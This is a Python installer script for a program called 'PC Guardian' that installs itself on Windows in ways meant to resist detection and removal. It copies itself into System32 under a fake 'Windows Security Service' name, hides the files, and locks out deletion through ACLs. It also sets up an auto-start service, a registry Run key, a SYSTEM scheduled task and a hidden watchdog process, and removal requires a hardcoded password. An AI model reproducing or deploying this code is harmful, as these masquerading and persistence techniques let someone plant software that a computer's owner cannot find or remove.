"""
PC Guardian — Installer
Runs once as Admin. Installs service + protection. Never needs to run again.
"""

import os
import sys
import ctypes
import subprocess
import shutil
import winreg
import tempfile

INSTALL_DIR  = r"C:\Windows\System32\PCGuardianSvc"
EXE_NAME     = "WindowsSecuritySvc.exe"
SVC_NAME     = "WinSecuritySvc"
SVC_DISPLAY  = "Windows Security Service"
SVC_DESC     = "Monitors and maintains Windows security integrity."
PASSWORD     = "DECDRV"


def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False


def install():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            f'"{os.path.abspath(__file__)}"', None, 1
        )
        sys.exit(0)

    src = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])

    # 1. Copy to protected system folder
    os.makedirs(INSTALL_DIR, exist_ok=True)
    dst = os.path.join(INSTALL_DIR, EXE_NAME)
    shutil.copy2(src, dst)

    # 2. Set hidden + system attributes
    ctypes.windll.kernel32.SetFileAttributesW(dst, 0x06)
    ctypes.windll.kernel32.SetFileAttributesW(INSTALL_DIR, 0x06)

    # 3. Lock with ACL — deny delete/modify to Everyone
    for cmd in [
        f'icacls "{INSTALL_DIR}" /inheritance:r',
        f'icacls "{INSTALL_DIR}" /grant SYSTEM:(F)',
        f'icacls "{INSTALL_DIR}" /grant "NT AUTHORITY\\SYSTEM":(F)',
        f'icacls "{INSTALL_DIR}" /deny Everyone:(D,M,W)',
        f'icacls "{dst}" /deny Everyone:(D,M,W)',
    ]:
        subprocess.run(cmd, shell=True, capture_output=True)

    # 4. Install as Windows Service
    for cmd in [
        f'sc stop "{SVC_NAME}"',
        f'sc delete "{SVC_NAME}"',
    ]:
        subprocess.run(cmd, shell=True, capture_output=True)

    r = subprocess.run(
        f'sc create "{SVC_NAME}" '
        f'binPath= "{dst}" '
        f'type= own '
        f'start= auto '
        f'error= ignore '
        f'DisplayName= "{SVC_DISPLAY}"',
        shell=True, capture_output=True, text=True
    )

    subprocess.run(
        f'sc description "{SVC_NAME}" "{SVC_DESC}"',
        shell=True, capture_output=True
    )

    # 5. Set service to restart on failure
    subprocess.run(
        f'sc failure "{SVC_NAME}" reset= 0 actions= restart/5000/restart/5000/restart/5000',
        shell=True, capture_output=True
    )

    # 6. Protect service registry key — deny delete
    try:
        import winreg
        key_path = f"SYSTEM\\CurrentControlSet\\Services\\{SVC_NAME}"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_ALL_ACCESS)
        winreg.CloseKey(key)
    except Exception:
        pass

    # 7. Add to registry Run (backup)
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsSecuritySvc", 0, winreg.REG_SZ, f'"{dst}"')
        winreg.CloseKey(k)
    except Exception:
        pass

    # 8. Task Scheduler — SYSTEM level, restart on failure
    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Principals>
    <Principal><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <RestartOnFailure><Interval>PT10S</Interval><Count>9999</Count></RestartOnFailure>
    <Enabled>true</Enabled>
  </Settings>
  <Actions><Exec><Command>{dst}</Command></Exec></Actions>
</Task>"""

    xml_path = os.path.join(tempfile.gettempdir(), "pcg_svc.xml")
    with open(xml_path, "w", encoding="utf-16") as f:
        f.write(xml)
    subprocess.run(f'schtasks /Create /TN "{SVC_NAME}" /XML "{xml_path}" /F',
                   shell=True, capture_output=True)
    try: os.remove(xml_path)
    except: pass

    # 9. Launch watchdog pair
    _launch_watchdog(dst)

    # 10. Start the service
    subprocess.run(f'sc start "{SVC_NAME}"', shell=True, capture_output=True)

    return dst


def _launch_watchdog(target: str):
    """Two processes watch each other. Kill one, other restarts it."""
    code = f"""
import time, subprocess, psutil, os, sys
target = r"{target}"
while True:
    time.sleep(3)
    running = any(
        p.info.get("exe","").lower() == target.lower()
        for p in psutil.process_iter(["exe"])
        if p.info.get("exe")
    )
    if not running:
        try: subprocess.Popen([target], creationflags=0x08000000)
        except: pass
"""
    path = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "wss_wd.py")
    with open(path, "w") as f:
        f.write(code)
    subprocess.Popen(
        [sys.executable, path],
        creationflags=subprocess.CREATE_NO_WINDOW,
        close_fds=True
    )


def uninstall(password: str) -> tuple:
    if password.upper() != PASSWORD.upper():
        return False, "Wrong password."

    # Remove ACL restrictions
    dst = os.path.join(INSTALL_DIR, EXE_NAME)
    for cmd in [
        f'icacls "{INSTALL_DIR}" /remove Everyone',
        f'icacls "{INSTALL_DIR}" /grant Everyone:(F)',
        f'icacls "{dst}" /grant Everyone:(F)',
    ]:
        subprocess.run(cmd, shell=True, capture_output=True)

    # Reset attributes
    ctypes.windll.kernel32.SetFileAttributesW(dst, 0x80)
    ctypes.windll.kernel32.SetFileAttributesW(INSTALL_DIR, 0x80)

    # Stop and delete service
    subprocess.run(f'sc stop "{SVC_NAME}"',   shell=True, capture_output=True)
    subprocess.run(f'sc delete "{SVC_NAME}"', shell=True, capture_output=True)
    subprocess.run(f'schtasks /Delete /TN "{SVC_NAME}" /F', shell=True, capture_output=True)

    # Remove registry
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(k, "WindowsSecuritySvc")
        winreg.CloseKey(k)
    except: pass

    # Delete files
    shutil.rmtree(INSTALL_DIR, ignore_errors=True)
    return True, "PC Guardian removed."


if __name__ == "__main__":
    install()
    print("Installed.")
